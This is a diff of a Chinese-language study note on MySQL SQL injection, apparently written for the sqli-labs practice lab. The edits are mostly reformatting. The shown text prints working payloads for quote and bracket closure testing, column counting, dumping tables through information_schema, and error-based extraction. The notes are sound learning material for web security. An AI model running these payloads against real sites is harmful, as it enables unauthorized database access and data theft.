@@ -1,7 +1,7 @@
 ---
 title: SQLi-笔记
 published: 2026-09-05
-description: A comprehensive guide to SQL injection techniques, including blind SQL injection, error-based injection, and methods for extracting database information.
+description: 全面介绍SQL注入技术，包括盲注、报错注入以及提取数据库信息的方法。
 tags:
   - SQL
   - MySQL
@@ -16,8 +16,6 @@ draft: false
 -- 和#和/* */  
 注意-- 和--+的关系，+在url里可作空格
 ```
----
-
 ### 闭合方式判断
 
 #### 有无括号的判断
@@ -26,10 +24,10 @@ draft: false
 
 ##### 方法 1：`2'&&'1'='1`
 
-| 查询语句形式 | 注入后的语句 | 实际效果 | 回显 |
-|---|---|---|---|
-| `where id='$id'` | `where id='2'&&'1'='1'` | 等价于 `where id='2'` | `id=2` |
-| `where id=('$id')` | `where id=('2'&&'1'='1')` | MySQL 将 `('2'&&'1'='1')` 作为 Bool 值，等价于 `where id=('1')` | `id=1` |
+| 查询语句形式             | 注入后的语句                    | 实际效果                                         | 回显     |
+| ------------------ | ------------------------- | -------------------------------------------- | ------ |
+| `where id='$id'`   | `where id='2'&&'1'='1'`   | 等价于 `where id='2'`                           | `id=2` |
+| `where id=('$id')` | `where id=('2'&&'1'='1')` | 会将 `('2'&&'1'='1')` 作为 Bool 值，等价于 `id=('1')` | `id=1` |
 
 ##### 方法 2：`1')||'1'=('1`
 
@@ -45,9 +43,9 @@ draft: false
 
 URL 中 `&`、`|` 等特殊字符需要编码：
 
-| 字符 | URL 编码 |
-|---|---|
-| `&` | `%26` |
+| 字符   | URL 编码        |
+| ---- | ------------- |
+| `&`  | `%26`         |
 | `\|` | `%7c` 或 `%7C` |
 
 例如：
@@ -56,9 +54,6 @@ URL 中 `&`、`|` 等特殊字符需要编码：
 &  → %26
 |  → %7c
 ```
-
----
-
 ### `order by 10` 
 
 `order by N` 是 SQL 里用来**按列排序**的语法，这里的 `N` 代表「按第 N 列排序」，在 SQL 注入里是用来**快速猜解查询列数**的经典手法。
@@ -89,9 +84,6 @@ SELECT id, name, age FROM users ORDER BY 3;
 比如原查询是 2 列，你要执行 `union select 1,2`，如果列数不匹配，SQL 会直接报错，注入就失败了。
 
 所以 `order by` 是 SQL 注入里，做联合查询之前的「必做步骤」。
-
----
-
 ### 公开系统表 `information_schema`
 
 > SQL 注入信息收集 —— 公开系统表 `information_schema`
@@ -125,8 +117,6 @@ SELECT id, name, age FROM users ORDER BY 3;
 (select table_name from information_schema.tables where table_schema=database() limit 0,1)  -- 查当前库下第一张表的表名
 ```
 由全局的表，用所属库，筛出limit 0,1的表名
-
----
 ### 聚合函数group_concat
 
 例句：
@@ -136,9 +126,6 @@ UNION
 SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()
 -- 表名一次全拿的例子
 ```
-
----
-
 ### 查询一条龙
 ```sql
 爆库名
@@ -163,9 +150,6 @@ SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table
 `ascii(字符)` 返回这个字符的 ASCII 码数字。  
 字母 `s` 的 ASCII 码是 `115`。  
 所以，`ascii('s')` 的结果是数字 `115`。
-
----
-
 ### 报错注入
 
 什么是XML？什么是XPath？先打通sqli-labs, 通常用and接,因为要报错使其回显
@@ -204,8 +188,6 @@ extractvalue(目标XML, 查询路径)
 ?id=1' and (select 1 from (select count(*),concat(floor(rand(0)*2),(查询语句)) as x from information_schema.tables group by x) as a)--+
 ```
 核心结构：**concat( floor(rand(0)\*2), (你的查询语句) )**
-
----
 ### 布尔盲注
 
 (基于sqli-lab Less-7)
